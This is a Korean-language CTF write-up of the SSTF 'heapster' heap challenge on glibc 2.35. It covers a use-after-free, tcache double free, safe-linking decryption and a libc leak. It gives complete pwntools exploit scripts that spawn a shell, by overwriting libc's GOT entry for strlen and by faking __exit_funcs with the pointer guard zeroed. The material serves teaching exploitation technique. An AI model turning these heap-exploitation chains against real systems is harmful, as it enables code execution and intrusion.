---
title: "[Write-Up] SSTF heapster"
author: pwndorei 
tags: [pwndorei, ctf, pwnable, sstf, heap]
categories: [Write-Up]
date: 2023-09-01 15:00:00
cc: false
index_img: /sstf-heapster/index.png
---

안녕하세요! 새롭게 HackyBoiz의 팀원이 된 pwndorei라고 합니다! ~~dorai 아닙니다~~ 국방의 의무를 다하러 간 poosic의 뒤를 이어 막내 포지션을 담당하게 되어 앞으로 pwnable 관련 글들로 찾아뵙게 될 것 같습니다.

![~~R.I.P poosic…~~](sstf-heapster/Untitled.png)

~~R.I.P poosic…~~

무튼 저의 첫 글은 얼마 전에 있었던 SSTF에 출제된 pwnable 문제인 heapster의 write up입니다!

# Init

heapster는 이름에서 알 수 있는 것처럼 Heap 문제입니다. 함께 주어진 glibc의 버전은 2.35네요. 바이너리에 적용된 미티게이션을 `checksec`으로 확인해본 결과는 아래와 같습니다

```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

모든 미티게이션이 적용되어 있는 것을 확인할 수 있었습니다. 올해 초부터 Windows를 중점적으로 공부하며 리눅스 포너블을 게을리한 결과 저는 이때까진 hook overwrite로 익스플로잇 할 수 있을 것이란 행복한 상상에 빠져있었습니다… 후에 hook overwrite로 익스플로잇이 되지 않는 것을 이상하게 여겨 뒤늦게 glibc 2.34 [릴리즈 노트](https://sourceware.org/pipermail/libc-alpha/2021-August/129718.html)를 보고 `__malloc_hook`, `__free_hook`, `__memalign_hook` 등의 hook이 deprecate되었다는 것을 알게 되었습니다...

# Analysis

이제 바이너리를 분석해보면서 어떤 기능을 수행하고 어디에 취약점이 있는지 알아봅시다. 먼저 `main`함수부터 보자면 아래와 같습니다

## main

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned int idx; // [rsp+8h] [rbp-38h] BYREF
  int menu; // [rsp+Ch] [rbp-34h] BYREF
  int v6; // [rsp+10h] [rbp-30h]
  unsigned int v7; // [rsp+14h] [rbp-2Ch]
  __int64 v8; // [rsp+18h] [rbp-28h]
  char buf[24]; // [rsp+20h] [rbp-20h] BYREF
  unsigned __int64 v10; // [rsp+38h] [rbp-8h]

  v10 = __readfsqword(0x28u);
  v8 = 0LL;
  idx = 0;
  v6 = 0;
  menu = 0;
  v7 = 0;
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  init();
  while ( v6 <= 0xC34F )
  {
    printf("cmd: ");
    __isoc99_scanf("%d", &menu);
    if ( menu == 4 )
    {
      v7 = validation();
      if ( v7 )
        puts("success.");
      else
        puts("fail.");
    }
    else
    {
      if ( menu > 4 )
        return 0;
      switch ( menu )
      {
        case 3:
          print();
          break;
        case 1:
          __isoc99_scanf("%d", &idx);
          v7 = read(0, buf, 0x10uLL);
          buf[v7 - 1] = 0;
          add(idx, buf, v7);
          break;
        case 2:
          __isoc99_scanf("%d", &idx);
          del(idx);
          break;
        default:
          return 0;
      }
    }
    fflush(stdin);
    menu = 0;
    ++v6;
  }
  return 0;
}
```

cmd로 입력 받은 값(1~4)에 따라 add, del, print, validation 함수를 호출하고 그 외의 cmd를 입력 받으면 프로그램이 종료된다는 것을 알 수 있습니다. `add` 함수가 호출되는 부분을 먼저 살펴보자면 정수를 입력 받고 `read`를 통해 stack 버퍼에 최대 0x10 바이트의 입력을 받은 다음 마지막 바이트를 `\0`으로 바꿔주네요. 이후 이 값들과 입력 받은 데이터의 길이를 인자로 `add`를 호출합니다

## add

```c
void __fastcall add(unsigned int a1, const void *a2, unsigned int a3)
{
  if ( a1 <= 31 )
  {
    if ( !node[a1] )
      node[a1] = (Node *)malloc(0x14uLL);
    node[a1]->inuse = 1;
    memcpy(node[a1], a2, a3);
  }
}
```

`main`에서 `add`를 호출할 때 사용되는 변수의 이름으로 눈치 채셨겠지만 특정 인덱스에 사용자로부터 입력 받은 데이터를 저장하는 동작을 수행합니다. `node`는 .bss에 존재하는 길이 0x20의 포인터 배열로 `malloc`으로 할당된 `Node` 구조체들을 가리킵니다. 제가 정의한 이 구조체는 아래와 같습니다

```c
typedef struct _Node{
	char buf[0x10];
	int inuse;
}Node;
```

`add`에서는 `node[a1]`이 NULL이면 `malloc`으로 새로 할당하고 `inuse`를 1로 바꾼 다음 사용자로부터 입력 받은 데이터를 데이터의 길이 만큼만 복사합니다.

## del

다음으로 `del`함수입니다. 함수명에서부터 `add`에서 할당된 `Node`를 해제하는 기능을 수행할 것으로 예측됩니다.

```c
void __fastcall del(int a1)
{
  if ( node[a1] )
  {
    if ( node[a1]->inuse == 1 )
    {
      node[a1]->inuse = 0;
      free(node[a1]);                           // dangling ptr
    }
  }
}
```

예측대로 `free`가 호출되며 특정 인덱스의 `Node`를 해제하는 것을 볼 수 있습니다! 당연히  `node[a1]`이 NULL이 아니어야 하고 `inuse` 또한 1이어야 `free`가 호출됩니다. 

## print

```c
int print()
{
  int i; // [rsp+Ch] [rbp-4h]

  for ( i = 0; i <= 31; ++i )
  {
    if ( node[i] && strlen(node[i]->buf) > 5 )
      printf("->%s\n", node[i]->buf);
  }
  return puts("----");
}
```

`node[i]` 가 NULL이 아니고 데이터인 문자열의 길이가 5보다 크면 출력해주는 것을 알 수 있습니다.

# Vulnerability

직전에 살펴본 `del`함수에서는  `free`한 후 `node[a1]`을 NULL로 초기화하고 있지 않습니다. 이러면 UAF(Use-After-Free) 취약점이 발생할 수도 있겠네요! 다시 `add`를 살펴보면 `del`로 해제한 `Node`에 데이터를 쓰는 것이 가능합니다! `add`에서 할당된 청크의 크기는 0x20일 것이고 이는 tcache에 들어가는 크기입니다. 따라서 tcache에 들어간 해제된 청크의 `tcache_entry.key`를 덮어쓰는 것으로 double free 탐지를 우회할 수 있고 tcache dup까지 가능합니다! 또한 `print`에서 `inuse`인지는 확인하지 않기 때문에 `next`에 저장된 힙 포인터까지 유출할 수 있겠네요!

# Exploit

## Double Free & Tcache Dup

그럼 double free와 tcache dup이 실제로 가능한지 확인해볼 차례입니다.

```python
from pwn import *

context.log_level = 'debug'

p = process("./chal")

cmd = lambda x: p.sendlineafter(b'cmd:', str(x).encode())

def add(idx, data):
    cmd(1)
    p.sendline(str(idx).encode())
    p.sendline(data)

def delete(idx):
    cmd(2)
    p.sendline(str(idx).encode())

add(0, "double free")

delete(0)

add(0, p64(0) * 2) #overwrite tcache_entry.next & key

delete(0)#double free

gdb.attach(p)

p.interactive()
```

![Untitled](sstf-heapster/Untitled%201.png)

double free되면서 tcache에 같은 청크가 두 개 들어간 것을 확인할 수 있습니다. 그런데 `next` 포인터가 조금 이상한 것 같죠? 이는 safe linking이 적용되었기 때문입니다. glibc 2.32부터 추가된 safe linking은 fastbin과 tcache bin 연결리스트를 구성하는 fd, next 포인터를 쉽게 변조하지 못하게 xor 인코딩해서 저장하는 보호 기법입니다. 포인터의 인코딩, 디코딩에 사용되는 매크로인 `PROTECT_PTR`과 `REVEAL_PTR`은 아래와 같이 정의되어 있습니다.

```c
#define PROTECT_PTR(pos, ptr) \
  ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))
#define REVEAL_PTR(ptr)  PROTECT_PTR (&ptr, ptr)
```

`pos`는 `ptr`이 저장될 `fd`나 `next`필드의 주소이고 `ptr`은 `pos` 청크가 `fd`(fastbin)나 `next`(tcache)로 가리킬 다른 청크의 주소입니다. 따라서 `&ptr == pos`입니다. decrypt safe linking을 하려면 원래는 heap 주소를 알 필요가 있습니다. `REVEAL_PTR`이 `ptr`의 주소와 값을 `PROTECT_PTR`하기 때문이죠. 하지만 다른 특징을 이용한다면 `ptr` 값 만을 가지고도 복호화하는 것이 가능합니다.

## Decrypt Safe Linking

 `pos`를 12만큼 오른쪽으로 시프트한 값에 대해 생각해봅시다. 이러면 하위 12비트가 사라질 것입니다. 그런데 이 하위 12비트는 ASLR이 적용되어도 바뀌지 않는 오프셋에 해당되는 값입니다! 그럼 `ptr`과 `pos`가 이 하위 12비트 이외의 모든 비트가 동일하다면 어떻게 될까요?… 좀 더 쉽게 pos와 ptr을 LSB부터 12비트씩 나눠 $x_n, y_n$라고 해보겠습니다. 그럼 `PROTECT_PTR`은  $x_4x_3x_2$^$y_4y_3y_2y_1$로 표현이 됩니다. 그런데 여기서 $x_n$과 $y_n$은 $x_1$과 $y_1$ 외에는 전부 같은 값이니까 $y_4y_3y_2$^$y_4y_3y_2y_1$로 바꿀 수 있습니다!!! 이 결과를 12비트씩 나누어 보자면 $y4$, $y_4$^$y_3$, $y_3$^$y_2$, $y_2$^$y_1$ 입니다. y4는 여전히 그대로고 a ^ b가 c이면 c ^ b는 a라는 특징을 이용해서 $y_4$ ^ $y_3$을 $y_4$와 XOR해서 $y_3$을 복원하고 이를 반복하면 `ptr`을 온전히 복원할 수 있습니다

```python
from pwn import *

context.log_level = 'debug'

p = process("./chal")

cmd = lambda x: p.sendlineafter(b'cmd:', str(x).encode())

def decrypt_safe_linking(ptr):
    _12bits = []
    dec = 0
    while ptr != 0:
        _12bits.append(ptr & 0xfff)
        ptr = ptr >> 12

    x = _12bits.pop()
    while len(_12bits) > 0:
        dec |= x
        dec = dec << 12
        y = _12bits.pop()
        x = x ^ y
    dec |= x

    return dec

 
def add(idx, data):
    cmd(1)
    p.sendline(str(idx).encode())
    p.sendline(data)

def delete(idx):
    cmd(2)
    p.sendline(str(idx).encode())

add(0, "double free")

delete(0)

add(0, p64(0) * 2) #overwrite tcache_entry.next & key

delete(0)#double free

cmd(3)

p.recvuntil(b'->')
ptr = u64(p.recvline()[:-1].ljust(8, b'\x00'))

print(hex(ptr))
print(hex(decrypt_safe_linking(ptr)))

heap_base = decrypt_safe_linking(ptr) - 0x2a0

gdb.attach(p)

p.interactive()
```

![Untitled](sstf-heapster/Untitled%202.png)

## Arbitrary Read/Write

이제 tcache dup도 했고 heap base도 알아냈고 safe link까지 풀었으니 `next` 포인터를 조작해서 임의의 주소에 청크를 할당해 봅시다!! 

### libc base leakage

그런데 어디에 할당해야 할까요?… 제일 처음 생각한 것은 제가 hook overwrite로 익스플로잇이 가능할 것이라 굳게 믿고 있었기 때문에 GOT에 청크를 할당하고 읽어서 libc base를 알아내려 했습니다. 그런데 이 바이너리는 Full RELRO가 적용되어 있습니다 ㅠㅠ. 할당까지는 어떻게 한다 해도 `add`에서 호출되는 `memcpy`로 GOT에 데이터를 쓴다면 프로세스가 그대로 죽어버리겠죠… 따라서 unsorted bin에 들어간 청크의 fd에 쓰인 main_arena 주소를 통해 libc_base를 알아내겠습니다. 하지만 `add`에서 확인할 수 있는 것처럼 `malloc`의 인자는 0x14로 고정되어 있습니다. 이러면 unsorted bin 크기의 청크를 할당할 수가 없습니다!!!… 따라서 다른 청크의 헤더에 청크를 할당하고 여기에 데이터를 쓰는 것으로 size 필드를 수정해 unsorted bin에 들어가게 만들어보죠. 다섯 개의 연속적인 청크를 할당하고 가장 낮은 주소의 청크의 헤더에 청크를 할당한 다음 size를 0xa1으로 변경했습니다(PREV_INUSE 포함)

![Untitled](sstf-heapster/Untitled%203.png)

이 상태에서 크기 0xa1인 청크를 해제한다면!….

![Untitled](sstf-heapster/Untitled%204.png)

당연히 tcache로 들어갑니다 ㅋㅋㅋㅋ 하지만 우리는 double free 검사를 우회하는 것이 가능합니다! 크기가 0xa1로 변조된 청크를 double도 아니고 무려 octuple free를 해준다면!

![Untitled](sstf-heapster/Untitled%205.png)

unsorted bin에 들어간 청크를 얻을 수 있습니다👏🏻👏🏻. 여기서 `print`해준다면 libc 주소까지 얻는 것이 가능합니다!

```python
from pwn import *

context.log_level = 'debug'

p = process("./chal")

cmd = lambda x: p.sendlineafter(b'cmd:', str(x).encode())

def decrypt_safe_linking(ptr):
    _12bits = []
    dec = 0
    while ptr != 0:
        _12bits.append(ptr & 0xfff)
        ptr = ptr >> 12

    x = _12bits.pop()
    while len(_12bits) > 0:
        dec |= x
        dec = dec << 12
        y = _12bits.pop()
        x = x ^ y
    dec |= x

    return dec

def safe_link(pos, ptr):
    return (pos >> 12) ^ ptr

def add(idx, data):
    cmd(1)
    p.sendline(str(idx).encode())
    p.sendline(data)

def delete(idx):
    cmd(2)
    p.sendline(str(idx).encode())

add(0, "double free")

add(1, b'victim')

for i in range(2,6):
    add(i, b'data')

add(6, b'guard chunk') # to avoid consolidating with top chunk

delete(0)

add(0, p64(0) * 2) #overwrite tcache_entry.next & key

delete(0)#double free

cmd(3)

p.recvuntil(b'->')
ptr = u64(p.recvline()[:-1].ljust(8, b'\x00'))

print(hex(ptr))
print(hex(decrypt_safe_linking(ptr)))
heap_base = decrypt_safe_linking(ptr) - 0x2a0
print(hex(heap_base))

add(0, p64(safe_link(heap_base + 0x2a0, heap_base + 0x2a0 + 0x10)))

add(7, b'dummy')

add(8, p64(0) + p64(0xa1))

# octuple free

delete(1)
for i in range(7):
    add(1, b'A'*0xf)
    delete(1)

cmd(3)

p.recvuntil(b'->')
libc_base = u64(p.recvline()[:-1].ljust(8, b'\x00')) - 0x219ce0

print(hex(libc_base))

gdb.attach(p)

p.interactive()
```

## GOT Overwrite

네? Full RELRO인데 왜 GOT Overwrite를 할 생각을 하냐고요?…. Full RELRO는 heapster 바이너리에 적용되어 있는 거지 함께 제공된 libc.so.6은 Partial RELRO라서 GOT Overwrite할 수 있습니다!

![7wnlkc.jpg](sstf-heapster/7wnlkc.jpg)

사실 저도 얼마 전 공개된 다른 팀의 write up을 보고 위와 같은 사실을 알게 되었습니다… 평소 리눅스를 게을리하지 않아 진작 알고 계셨던 분들은 이게 아니면 대체 뭘로 익스플로잇을 했을까 싶으실 수도 있을 것 같은데요. 저는 이런 중요한 사실을 몰라서 `__exit_funcs`를 덮어쓰는 것으로 익스플로잇 했습니다! ~~이게 또 엄청 오래 걸려서 대회 종료 15분 전에 아슬아슬하게 플래그 제출한건 비밀~~

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'

p = process("./chal")
l = ELF("./libc.so.6")

cmd = lambda x: p.sendlineafter(b'cmd:', str(x).encode())

heap_base = 0

def decrypt_safe_linking(ptr):
    _12bits = []
    dec = 0
    while ptr != 0:
        _12bits.append(ptr & 0xfff)
        ptr = ptr >> 12

    x = _12bits.pop()
    while len(_12bits) > 0:
        dec |= x
        dec = dec << 12
        y = _12bits.pop()
        x = x ^ y
    dec |= x

    return dec

def safe_link(pos, ptr):
    return (pos >> 12) ^ ptr

def add(idx, data):
    cmd(1)
    p.sendline(str(idx).encode())
    p.sendline(data)

def delete(idx):
    cmd(2)
    p.sendline(str(idx).encode())

def overwrite_data(addr, data, dummyIdx, idx):
    global heap_base
    add(0, p64(0)*2)
    delete(0)
    add(0, p64(0)*2)
    delete(0)
    add(0, p64(safe_link(heap_base+0x2a0, addr)))
    add(dummyIdx, b'dummy')
    add(idx, data)

add(0, "double free")

add(1, b'victim')

for i in range(2,6):
    add(i, b'data')

add(6, b'guard chunk') # to avoid consolidating with top chunk

delete(0)

add(0, p64(0) * 2) #overwrite tcache_entry.next & key

delete(0)#double free

cmd(3)

p.recvuntil(b'->')
ptr = u64(p.recvline()[:-1].ljust(8, b'\x00'))

print(hex(ptr))
print(hex(decrypt_safe_linking(ptr)))
heap_base = decrypt_safe_linking(ptr) - 0x2a0
print(hex(heap_base))

add(0, p64(safe_link(heap_base + 0x2a0, heap_base + 0x2a0 + 0x10)))

add(7, b'dummy')

add(8, p64(0) + p64(0xa1))

# octuple free

delete(1)
for i in range(7):
    add(1, b'A'*0xf)
    delete(1)

cmd(3)

p.recvuntil(b'->')
libc_base = u64(p.recvline()[:-1].ljust(8, b'\x00')) - 0x219ce0

print(hex(libc_base))

#gdb.attach(p)

overwrite_data(libc_base + 0x219090, p64(libc_base+l.sym['system'])*2, 30,31)

add(0, b"/bin/sh\x00")

cmd(3)

p.interactive()
```

got overwrite를 이용한 풀이는 위와 같습니다! `add`를 통해 0번에 `/bin/sh`을 써놓고 `print`하면 `printf("->%s\n", node[0]->buf);`이 실행되고 `printf`내부에서 두 번째 인자로 전달된 “/bin/sh”의 길이를 알아내기 위해 `strlen("/bin/sh")`이 호출됩니다. 그런데 여기서 `strlen`의 got는 `system`으로 덮여있기 때문에 결국 실행되는건 `system(”/bin/sh”)`이고 따라서 쉘을 얻을 수 있습니다.

이것으로 간결하고 우아한 익스플로잇이 끝났습니다. 이젠 머리아프고 복잡한 `__exit_funcs` overwrite를 통한 익스플로잇을 알아봅시다!…

## __exit_funcs overwrite

먼저 `__exit_funcs`에 대해 간략하게 알아봅시다. `exit` 함수가 호출되면 내부적으로 `__run_exit_handlers` 함수를 호출하고 여기서 `__exit_funcs`가 가리키는 `exit_function_list`를 참조하여 함수들을 호출하게 됩니다.

```c
void
attribute_hidden
__run_exit_handlers (int status, struct exit_function_list **listp,
		     bool run_list_atexit, bool run_dtors)
{
  /* First, call the TLS destructors.  */
#ifndef SHARED
  if (&__call_tls_dtors != NULL)
#endif
    if (run_dtors)
      __call_tls_dtors ();

  __libc_lock_lock (__exit_funcs_lock);

  /* We do it this way to handle recursive calls to exit () made by
     the functions registered with `atexit' and `on_exit'. We call
     everyone on the list and use the status value in the last
     exit (). */
  while (true)
    {
      struct exit_function_list *cur = *listp;

      if (cur == NULL)
	{
	  /* Exit processing complete.  We will not allow any more
	     atexit/on_exit registrations.  */
	  __exit_funcs_done = true;
	  break;
	}

      while (cur->idx > 0)
	{
	  struct exit_function *const f = &cur->fns[--cur->idx];
	  const uint64_t new_exitfn_called = __new_exitfn_called;

	  switch (f->flavor)
	    {
	      void (*atfct) (void);
	      void (*onfct) (int status, void *arg);
	      void (*cxafct) (void *arg, int status);
	      void *arg;

	    case ef_free:
	    case ef_us:
	      break;
	    case ef_on:
	      onfct = f->func.on.fn;
	      arg = f->func.on.arg;
#ifdef PTR_DEMANGLE
	      PTR_DEMANGLE (onfct);
#endif
	      /* Unlock the list while we call a foreign function.  */
	      __libc_lock_unlock (__exit_funcs_lock);
	      onfct (status, arg);
	      __libc_lock_lock (__exit_funcs_lock);
	      break;
	    case ef_at:
	      atfct = f->func.at;
#ifdef PTR_DEMANGLE
	      PTR_DEMANGLE (atfct);
#endif
	      /* Unlock the list while we call a foreign function.  */
	      __libc_lock_unlock (__exit_funcs_lock);
	      atfct ();
	      __libc_lock_lock (__exit_funcs_lock);
	      break;
	    case ef_cxa:
	      /* To avoid dlclose/exit race calling cxafct twice (BZ 22180),
		 we must mark this function as ef_free.  */
	      f->flavor = ef_free;
	      cxafct = f->func.cxa.fn;
	      arg = f->func.cxa.arg;
#ifdef PTR_DEMANGLE
	      PTR_DEMANGLE (cxafct);
#endif
	      /* Unlock the list while we call a foreign function.  */
	      __libc_lock_unlock (__exit_funcs_lock);
	      cxafct (arg, status);
	      __libc_lock_lock (__exit_funcs_lock);
	      break;
	    }

	  if (__glibc_unlikely (new_exitfn_called != __new_exitfn_called))
	    /* The last exit function, or another thread, has registered
	       more exit functions.  Start the loop over.  */
            continue;
	}

      *listp = cur->next;
      if (*listp != NULL)
	/* Don't free the last element in the chain, this is the statically
	   allocate element.  */
	free (cur);
    }

  __libc_lock_unlock (__exit_funcs_lock);

  if (run_list_atexit)
    RUN_HOOK (__libc_atexit, ());

  _exit (status);
}
```

호출될 함수의 주소는 `PTR_MANGLE`, `PTR_DEMANGLE`을 통해 암호화, 복호화됩니다. 여기서 사용되는 값이 Pointer Guard인데 이는 fs:[0x30]에 위치해 있습니다. 사용될 때는 아래와 같이 호출될 함수의 주소를 0x11만큼 오른쪽으로 순환 시프트(ror)한 값과 XOR 연산을 취하게 되는데 따라서 이 값이 0이면 새롭게 구성할 `__exit_function_list`에서 함수를 0x11 만큼 왼쪽으로 순환 시프트(rol)해서 저장하면 됩니다

```c
/* Long and pointer size in bytes.  */
#define LP_SIZE	8

#define PTR_DEMANGLE(reg)	ror $2*LP_SIZE+1, reg;			     \
				xor __pointer_chk_guard_local(%rip), reg
```

이제 `__run_exit_handlers`의 동작과 관련 구조체들을 분석하고 익스플로잇을 작성해보죠!

### `__run_exit_handlers`

이 함수는 아래와 같이 `exit`함수에서 `__exit_funcs`의 주소를 인자로 호출됩니다

```c
void
exit (int status)
{
  __run_exit_handlers (status, &__exit_funcs, true, true);
}
```

`__exit_funcs`의 타입은 `struct exit_function_list *`이고 아래와 같습니다. `next` 필드를 통해 단일 연결리스트를 구성한다는 것을 알 수 있네요!

```c
struct exit_function
  {
    /* `flavour' should be of type of the `enum' above but since we need
       this element in an atomic operation we have to use `long int'.  */
    long int flavor;
    union
      {
	void (*at) (void);
	struct
	  {
	    void (*fn) (int status, void *arg);
	    void *arg;
	  } on;
	struct
	  {
	    void (*fn) (void *arg, int status);
	    void *arg;
	    void *dso_handle;
	  } cxa;
      } func;
  };
struct exit_function_list
  {
    struct exit_function_list *next;
    size_t idx;
    struct exit_function fns[32];
  };
```

`__run_exit_handlers`에서는 인자로 전달된 `listp`를 참조하여 `exit_funtion_list`의 첫 번째 함수 리스트의 주소를 가져와 `cur`에 저장합니다. 첫 번째 리스트가 `NULL`이 아니고 `cur->idx`가 0보다 크다면 `cur->fns[--cur->idx]`로 호출될 함수의 정보인 `exit_function`을 가져와 `f`에 저장합니다. whild 문이 반복될 때마다 `cur->idx`는 줄어들며 `cur->fns`의 함수들을 차례대로 실행하게 됩니다. 이후 `f->flavor`에 따라 함수를 호출하게 됩니다.

익스플로잇은  `system("/bin/sh")`이 실행되게 만드는 `exit_function_list`를 힙에 구성한 다음 `__exit_funcs`에 청크를 할당하고 이 힙 청크를 가리키게 만드는 것으로 이루어집니다. `system`에 대한 인자는 `f->flavor`가 `ef_cxa`일 경우 `cxafct (arg, status);`로 호출되는 것을 이용하면 전달할 수 있겠네요! 참고로 flavor는 아래와 같은 enum입니다

```c
enum
{
  ef_free,	/* `ef_free' MUST be zero!  */
  ef_us,
  ef_on,
  ef_at,
  ef_cxa// 4
};
```

### Exploit

`add`로 힙에 원하는 데이터를 자유롭게 쓸 수 있지만 그 크기는 0x10으로 제한되어 있고 이마저도 마지막 바이트는 NULL바이트로 바꿉니다. 따라서 전 단계에서 overlapping chunk를 만들기 위해 다른 청크의 헤더에 할당한 청크와 사이즈가 변조된 청크를 사용할 것 입니다. 이렇게 하면 총 0x20바이트를 쓰는 것이 가능합니다.

먼저 가짜 `exit_function_list`를 구성할 때 `system("/bin/sh")`이 호출된 이후의 상황은 고려할 필요가 없기 때문에 `next`는 굳이 설정하지 않을 겁니다. 그럼 힙에 쓸 데이터는 아래와 같은 형태를 띌 것입니다.

```
+0x00 : `any data` <- __exit_funcs
+0x08 : idx == 1
+0x10 : flavor == ef_cxa
+0x18 : function == rol(system,0x11)
+0x20 : arg_ptr == address of "/bin/sh" (in heap)
```

`idx`와 `flavor`는 overlapping chunk를 만들 때 청크의 헤더의 데이터를 덮어쓴 청크에 써주고 헤더가 변조된 청크에는 system 함수의 주소를 왼쪽으로 0x11 만큼 순환 시프트한 값과 `"/bin/sh"` 문자열의 주소를 써주면 되겠네요!

![Untitled](sstf-heapster/Untitled%206.png)

최종적으로 위와 같이 가짜 `exit_function_list`를 구성하고 `__exit_funcs`를 이 주소로 덮어 쓴 다음에 유효하지 않은 메뉴를 골라서 프로세스가 종료되게 만든다면!…

![Untitled](sstf-heapster/Untitled%207.png)

`system("/bin/sh")`이 호출되어 쉘이 얻어집니다!!! 👏🏻👏🏻👏🏻

```python
from pwn import *

context.log_level = 'debug'

p = process("./chal")
l = ELF("./libc.so.6")

cmd = lambda x: p.sendlineafter(b'cmd:', str(x).encode())

heap_base = 0

def decrypt_safe_linking(ptr):
    _12bits = []
    dec = 0
    while ptr != 0:
        _12bits.append(ptr & 0xfff)
        ptr = ptr >> 12

    x = _12bits.pop()
    while len(_12bits) > 0:
        dec |= x
        dec = dec << 12
        y = _12bits.pop()
        x = x ^ y
    dec |= x

    return dec

def safe_link(pos, ptr):
    return (pos >> 12) ^ ptr

def add(idx, data):
    cmd(1)
    p.sendline(str(idx).encode())
    p.sendline(data)

def delete(idx):
    cmd(2)
    p.sendline(str(idx).encode())

def overwrite_data(addr, data, dummyIdx, idx):
    global heap_base
    add(0, p64(0)*2)
    delete(0)
    add(0, p64(0)*2)
    delete(0)
    add(0, p64(safe_link(heap_base+0x2a0, addr)))
    add(dummyIdx, b'dummy')
    add(idx, data)

add(0, "double free")

add(1, b'victim')

for i in range(2,6):
    add(i, str(i).encode())

add(6, b'guard chunk') # to avoid consolidating with top chunk

delete(0)

add(0, p64(0) * 2) #overwrite tcache_entry.next & key

delete(0)#double free

cmd(3)

p.recvuntil(b'->')
ptr = u64(p.recvline()[:-1].ljust(8, b'\x00'))

print(hex(ptr))
print(hex(decrypt_safe_linking(ptr)))
heap_base = decrypt_safe_linking(ptr) - 0x2a0
print(hex(heap_base))

add(0, p64(safe_link(heap_base + 0x2a0, heap_base + 0x2a0 + 0x10)))

add(7, b'dummy')

add(8, p64(0) + p64(0xa1))

# octuple free

delete(1)
for i in range(7):
    add(1, b'A'*0xf)
    delete(1)

cmd(3)

p.recvuntil(b'->')
libc_base = u64(p.recvline()[:-1].ljust(8, b'\x00')) - 0x219ce0

print(hex(libc_base))

exit_funcs = libc_base + 0x219838
fs_base = libc_base - 0x28c0
initial = libc_base + 0x21af00
fake_exit_function_list = heap_base + 0x2a8

overwrite_data(fs_base+0x30, p64(0)*2, 30,31) #overwrite Pointer Guard
overwrite_data(exit_funcs-8, p64(fake_exit_function_list)*2, 28,29)

add(8, p64(1) + p64(4))# idx, flavor
add(1, p64(rol(libc_base+l.sym['system'], 0x11, word_size=64)) + p64(heap_base + 0x2a0))

add(0, b'/bin/sh')

cmd(0)

p.interactive()
```

# Fini

제가 이번 SSTF에 참가해서 푼 문제는 heapster 딱 하나였습니다... libc의 got를 overwrite할 생각은 하지도 못했고 같은 팀원 분이 exit_funcs를 덮어쓰는 익스플로잇 방법이 있다고 알려주셔서 찾아서 공부하고 시행착오를 좀 거치면서 장장 8시간 동안 풀었습니다 ~~문제 하나 풀고 그렇게 많은 사람들한테 축하 받은 건 처음이었습니다~~ 제가 유독 푸는데 좀 오래 걸리긴 했지만 좀 어려운 문제는 맞았는지 저희 팀을 포함해 총 10개 팀이 heapster를 해결했더군요. 이 글을 읽어주시는 분들은 저처럼 삽질하지 않고 libc의 got와 exit_funcs를 overwrite해서 익스플로잇하는 방법을 알아가시길 바라며 저의 첫 글을 마무리하겠습니다. 긴 글을 읽어주셔서 감사하고 앞으로도 잘 부탁드립니다!